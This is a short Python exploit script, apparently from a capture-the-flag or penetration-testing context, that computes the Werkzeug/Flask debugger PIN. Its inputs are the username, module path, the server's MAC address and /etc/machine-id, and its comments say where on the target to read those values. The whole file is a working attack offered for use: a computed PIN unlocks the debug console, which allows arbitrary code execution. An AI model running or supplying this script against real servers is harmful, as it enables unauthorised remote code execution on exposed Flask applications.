# Exploitation Steps
# python exploit.py
#  517-127-553
# Maybe sure you all the probably_public_bits and private_bits correctly.

import hashlib
from itertools import chain
probably_public_bits = [
	'www-data',# username username is the user who started this Flask, may be a specific user, or maybe you are just www-data is you accessed as anonymous
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),      # grab the path from a stack trace or something
]

private_bits = [
	'279275995014060',# str(uuid.getnode()), MAC Address in decimal formal 
                    # You might find this in /proc/net/arp or /sys/class/net/<interface_name>/address
	'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
